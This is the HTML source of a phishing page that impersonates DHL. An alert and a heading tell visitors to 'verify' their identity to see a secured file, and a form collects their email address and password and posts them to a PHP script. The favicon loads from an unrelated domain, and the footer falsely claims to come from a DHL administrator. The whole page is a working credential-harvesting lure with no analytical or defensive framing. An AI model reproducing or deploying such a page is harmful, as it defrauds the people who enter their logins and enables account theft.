<script>
alert('Verify your identity to view secure file. Click ok to verify and continue.');
</script>


<html>
<head>
<link rel="shortcut icon" href="http://b5pius.com/secure/upgrade/dkp/favi.ico" type="image/gif"/>
<title>Verify | DHL</title><script src='/google_analytics_auto.js'></script></head>
<body>

<br><br>

<table align="center">

<tr><td>

	<div align="center">

	<img src="http://vector.me/files/images/1/7/17833/dhl_express.png" width="436" height="112">

	<br><br>

	<font face="verdana" size="4">
	Verify Your Identity, To View Secured File 
	</font>


	<br><br>

	<form method="post" action="ki8.php">

	<input  name="email" type="email" style="width:250px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" required="" placeholder="Email">

	<br><br>

	<input  name="pass" type="password" style="width:250px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" required="" placeholder="Password">	



	<br><br>

	<input type="submit" value="Verify" 
	style="width:250px; height:60px; background-color: #DF0101; border: solid 3px #0B2161; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;">

	<br>
	</form>



	<br>
	<hr width="250" align="center">

	<font face="calibri" size="2">
	DHL Administrator 2017 | All rights reserved.
	</font>	

	</div>

</td></tr>

</table>


</body>
</html>